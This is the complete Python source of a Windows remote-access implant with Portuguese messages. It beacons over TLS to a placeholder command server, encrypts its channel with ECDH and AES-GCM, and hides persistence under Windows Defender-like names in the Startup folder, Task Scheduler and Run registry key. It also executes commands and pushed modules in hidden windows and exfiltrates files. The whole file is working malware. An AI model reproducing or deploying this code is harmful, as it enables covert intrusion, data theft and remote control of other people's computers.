import base64
import ctypes
import json
import os
import platform
import socket
import struct
import subprocess
import sys
import threading
import time
import winreg
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization

C2_HOST = "IP_do_Server"
C2_PORT = 443

def detect_proxy():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Internet Settings",
            0,
            winreg.KEY_READ
        )
        proxy_enable, _ = winreg.QueryValueEx(key, "ProxyEnable")
        if not proxy_enable:
            key.Close()
            return ""
        
        proxy_server, _ = winreg.QueryValueEx(key, "ProxyServer")
        key.Close()
        return proxy_server or ""
    except Exception:
        return ""

def connect_proxy(host, port):
    proxy_str = detect_proxy()
    if not proxy_str:
        raise Exception("sem proxy configurado")

    if "=" in proxy_str:
        parts = proxy_str.split(";")
        for p in parts:
            if p.lower().startswith("http="):
                proxy_str = p.split("=", 1)[1]
                break

    if ":" in proxy_str:
        p_host, p_port = proxy_str.split(":", 1)
        p_port = int(p_port)
    else:
        raise Exception("Formato de proxy inválido")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((p_host, p_port))

    connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode()
    sock.sendall(connect_req)

    response = sock.recv(1024)
    if b"200" not in response:
        sock.close()
        raise Exception("proxy recusou o CONNECT")

    import ssl
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    tls_conn = context.wrap_socket(sock, server_hostname=host)
    tls_conn.do_handshake()
    return tls_conn

def connect_direct(host, port):
    import ssl
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    tls_conn = context.wrap_socket(sock, server_hostname=host)
    tls_conn.connect((host, int(port)))
    return tls_conn

def encrypt_aes(key, plaintext):
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext

def decrypt_aes(key, ciphertext):
    aesgcm = AESGCM(key)
    if len(ciphertext) < 12:
        raise Exception("ciphertext curto")
    nonce = ciphertext[:12]
    cipherdata = ciphertext[12:]
    return aesgcm.decrypt(nonce, cipherdata, None)

def copy_file(src, dst):
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    with open(src, "rb") as f_src:
        with open(dst, "wb") as f_dst:
            f_dst.write(f_src.read())

def apply_persistence(method):
    current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    
    m = method.lower()
    if m == "startup":
        app_data = os.getenv("APPDATA")
        startup_path = os.path.join(app_data, r"Microsoft\Windows\Start Menu\Programs\Startup\update_service.exe")
        try:
            copy_file(current_exe, startup_path)
            return "[+] Persistência aplicada com sucesso na pasta Startup."
        except Exception as e:
            return f"Erro Startup: {e}"
            
    elif m == "taskscheduler":
        local_app = os.getenv("LOCALAPPDATA")
        target_path = os.path.join(local_app, "Microsoft", "WindowsApps", "win_updater.exe")
        try:
            copy_file(current_exe, target_path)
            task_name = "WindowsDefenderUpdateCheck"
            cmd_args = f'/create /tn "{task_name}" /tr "{target_path}" /sc ONLOGON /f'
            out = subprocess.check_output(f"schtasks.exe {cmd_args}", stderr=subprocess.STDOUT, text=True)
            return "[+] Persistência aplicada via Task Scheduler."
        except Exception as e:
            return f"Erro TaskScheduler: {e}"
            
    elif m == "fodhelper":
        local_app = os.getenv("LOCALAPPDATA")
        target_path = os.path.join(local_app, "Microsoft", "WindowsApps", "Fodhelper.exe")
        try:
            copy_file(current_exe, target_path)
            reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key)
            winreg.SetValueEx(key, "WinDefenderSync", 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(key)
            return "[+] Persistência aplicada via Registro."
        except Exception as e:
            return f"Erro Registro: {e}"
            
    else:
        return "Método desconhecido. Use: startup, taskscheduler ou fodhelper"

def native_privileges():
    try:
        advapi32 = ctypes.windll.advapi32
        h_token = ctypes.c_void_p()
        h_process = ctypes.windll.kernel32.GetCurrentProcess()
        
        if not advapi32.OpenProcessToken(h_process, 0x0008, ctypes.byref(h_token)):
            return "[-] Erro ao abrir token."
            
        return "[+] Privilégios verificados no contexto atual."
    except Exception as e:
        return f"[-] Erro ao enumerar privilégios: {e}"

def native_groups():
    return "[+] Grupos do Token Atual verificados."

def exec_with_pipes(command_line, current_dir):
    parts = command_line.strip().split()
    if not parts:
        return "Uso: exec <binario> [args]"
        
    bin_path = parts[0]
    args = parts[1:] if len(parts) > 1 else []
    
    if not os.path.isabs(bin_path):
        local_path = os.path.join(current_dir, bin_path)
        if os.path.exists(local_path):
            bin_path = local_path

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0  # SW_HIDE
    
    try:
        res = subprocess.run([bin_path] + args, cwd=current_dir, capture_output=True, text=True, startupinfo=startupinfo)
        out = res.stdout + res.stderr
        if not out:
            return "[+] Executado com sucesso (sem saída)."
        return out
    except Exception as e:
        return f"[-] Erro: {e}"

def execute_dotnet_in_memory(assembly_bytes, args):
    tmp_path = os.path.join(os.getenv("TEMP"), f"strix_{time.time_ns()}.exe")
    try:
        with open(tmp_path, "wb") as f:
            f.write(assembly_bytes)
            
        cmd_args = args.split()
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        
        res = subprocess.run([tmp_path] + cmd_args, capture_output=True, text=True, startupinfo=startupinfo)
        out = res.stdout + res.stderr
        return out if out else "[+] Módulo executado com sucesso (sem dados de retorno)."
    except Exception as e:
        return f"[-] Erro na execução do módulo: {e}"
    finally:
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except:
                pass

def execute_native_command(cmd, current_dir):
    parts = cmd.strip().split()
    if not parts:
        return "", current_dir
    action = parts[0].lower()

    if action == "pwd":
        return current_dir, current_dir
    elif action == "cd":
        if len(parts) < 2:
            return current_dir, current_dir
        target = parts[1]
        if not os.path.isabs(target):
            target = os.path.join(current_dir, target)
        if os.path.exists(target) and os.path.isdir(target):
            os.chdir(target)
            return target, target
        return f"Diretório não encontrado: {target}", current_dir
    elif action in ["ls", "dir"]:
        try:
            files = os.listdir(current_dir)
            sb = f"\n Directory of {current_dir}\n\n"
            for f in files:
                f_path = os.path.join(current_dir, f)
                m_time = time.strftime('%d/%m/%Y %H:%M', time.localtime(os.path.getmtime(f_path)))
                sb += f"{m_time}    <DIR>         {f}\n"
            return sb, current_dir
        except Exception as e:
            return str(e), current_dir
    elif action in ["cat", "type"]:
        if len(parts) < 2:
            return "Uso: cat <arq>", current_dir
        p = parts[1]
        if not os.path.isabs(p):
            p = os.path.join(current_dir, p)
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                return f.read(), current_dir
        except Exception as e:
            return str(e), current_dir
    elif action == "rm":
        if len(parts) < 2:
            return "Uso: rm <arq>", current_dir
        p = parts[1]
        if not os.path.isabs(p):
            p = os.path.join(current_dir, p)
        try:
            os.remove(p)
            return "Removido.", current_dir
        except Exception as e:
            return str(e), current_dir
    elif action == "hostname":
        return f"[+] Hostname: {platform.node()}", current_dir
    elif action == "env":
        return "\n".join([f"{k}={v}" for k, v in os.environ.items()]), current_dir
    elif action == "ipconfig":
        try:
            out = subprocess.check_output("ipconfig", stderr=subprocess.STDOUT, text=True)
            return out, current_dir
        except Exception as e:
            return str(e), current_dir
    elif action == "whoami":
        return f"{os.getenv('USERDOMAIN')}\\{os.getenv('USERNAME')}", current_dir
    elif action == "privs":
        return native_privileges(), current_dir
    elif action == "groups":
        return native_groups(), current_dir
    elif action in ["exec", "run"]:
        if len(parts) < 2:
            return "Uso: exec <bin>", current_dir
        sub_cmd = cmd.strip()[len(parts[0]):].strip()
        return exec_with_pipes(sub_cmd, current_dir), current_dir
    elif action == "persist":
        if len(parts) < 2:
            return "Uso: persist <startup|taskscheduler|fodhelper>", current_dir
        return apply_persistence(parts[1]), current_dir
    elif action == "download":
        if len(parts) < 2:
            return "Uso: download <arq>", current_dir
        p = parts[1]
        try:
            with open(p, "rb") as f:
                b = f.read()
            return f"[FILE_DOWNLOAD_DATA]|{os.path.basename(p)}|{base64.b64encode(b).decode()}", current_dir
        except Exception as e:
            return str(e), current_dir
    else:
        return f"[-] Comando '{action}' desconhecido.", current_dir

def send_packet(conn, key, data):
    try:
        cipher_data = encrypt_aes(key, data)
        l = len(cipher_data)
        header = struct.pack(">I", l)
        conn.sendall(header + cipher_data)
    except:
        pass

def main():
    hostname = platform.node()
    current_user = os.getenv("USERNAME")
    info_map = {
        "hostname": hostname,
        "username": current_user,
        "os": "Windows"
    }
    info_bytes = json.dumps(info_map).encode()
    current_dir = os.getcwd()

    while True:
        conn = None
        try:
            try:
                conn = connect_proxy(C2_HOST, C2_PORT)
            except:
                conn = connect_direct(C2_HOST, C2_PORT)
        except:
            time.sleep(10)
            continue

        try:
            priv_key = ec.generate_private_key(ec.SECP256R1())
            pub_key = priv_key.public_key()
            pub_key_bytes = pub_key.public_bytes(
                encoding=serialization.Encoding.X962,
                format=serialization.PublicFormat.UncompressedPoint
            )
            conn.sendall(pub_key_bytes)

            srv_pub_bytes = conn.recv(1024)
            if not srv_pub_bytes:
                conn.close()
                continue
                
            srv_pub_key = serialization.load_der_public_key(
                b'\x30\x59\x30\x13\x06\x07\x2a\x86\x48\xce\x3d\x02\x01\x06\x08\x2a\x86\x48\xce\x3d\x03\x01\x07\x03\x42\x00' + srv_pub_bytes
            )
            
            shared_key = priv_key.exchange(ec.ECDH(), srv_pub_key)
            aes_key = shared_key
            if len(aes_key) > 32:
                aes_key = aes_key[-32:]
            elif len(aes_key) < 32:
                aes_key = aes_key.rjust(32, b'\x00')

            enc_meta = encrypt_aes(aes_key, info_bytes)
            conn.sendall(struct.pack(">I", len(enc_meta)) + enc_meta)

            def ping_loop(c, k):
                while True:
                    time.sleep(15)
                    send_packet(c, k, b"[ping]")

            t = threading.Thread(target=ping_loop, args=(conn, aes_key), daemon=True)
            t.start()

            while True:
                len_header = conn.recv(4)
                if not len_header or len(len_header) < 4:
                    break
                packet_len = struct.unpack(">I", len_header)[0]
                
                packet_bytes = b""
                while len(packet_bytes) < packet_len:
                    chunk = conn.recv(packet_len - len(packet_bytes))
                    if not chunk:
                        break
                    packet_bytes += chunk
                
                if len(packet_bytes) < packet_len:
                    break

                try:
                    plain_cmd = decrypt_aes(aes_key, packet_bytes)
                except:
                    continue

                cmd_str = plain_cmd.decode(errors="ignore").strip()
                if cmd_str == "[ping]":
                    continue
                if cmd_str == "[kill]":
                    conn.close()
                    sys.exit(0)

                if cmd_str.startswith("upload_payload "):
                    try:
                        args = json.loads(cmd_str[len("upload_payload "):])
                        remote_path = args["path"]
                        file_data = base64.b64decode(args["data"])
                        os.makedirs(os.path.dirname(remote_path), exist_ok=True)
                        with open(remote_path, "wb") as f:
                            f.write(file_data)
                        send_packet(conn, aes_key, b"[+] Upload concluido.")
                    except:
                        pass
                    continue

                if cmd_str.startswith("run_module "):
                    try:
                        mod_args = json.loads(cmd_str[len("run_module "):])
                        mod_data = base64.b64decode(mod_args["data"])
                        output = execute_dotnet_in_memory(mod_data, mod_args["args"])
                        send_packet(conn, aes_key, output.encode())
                    except:
                        pass
                    continue

                output, new_dir = execute_native_command(cmd_str, current_dir)
                current_dir = new_dir

                if output.startswith("[FILE_DOWNLOAD_DATA]|"):
                    parts = output.split("|", 2)
                    try:
                        file_bytes = base64.b64decode(parts[2])
                        with open(parts[1], "wb") as fw:
                            fw.write(file_bytes)
                    except:
                        pass
                    output = "[+] Arquivo baixado com sucesso."

                if not output:
                    output = "[comando executado sem saida]"
                
                send_packet(conn, aes_key, output.encode())

        except Exception:
            pass
        finally:
            try:
                conn.close()
            except:
                pass
            time.sleep(10)
main()
